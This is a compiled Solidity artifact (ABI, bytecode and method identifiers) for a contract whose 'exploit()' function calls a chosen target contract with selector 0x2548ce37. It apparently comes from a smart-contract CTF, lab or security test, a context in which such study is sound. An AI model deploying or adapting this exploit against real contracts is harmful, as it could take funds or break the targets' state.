{"abi":[{"type":"constructor","inputs":[{"name":"_target","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"target","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516101633803806101638339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b031990921691909117905560ff806100646000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c806363d9b770146037578063d4b8399214603f575b600080fd5b603d606e565b005b604560ad565b6040805173ffffffffffffffffffffffffffffffffffffffff9092168252519081900360200190f35b6000632548ce3760e01b90506000546040516024810160405282815261010060048201526000806024836000865af19150508060a957600080fd5b5050565b60005473ffffffffffffffffffffffffffffffffffffffff168156fea2646970667358221220662205e894d816567ee00794e5d84f3d042502f7dc956cce2543eeb4e1c5e1de64736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"exploit()":"63d9b770","target()":"d4b83992"},"id":0}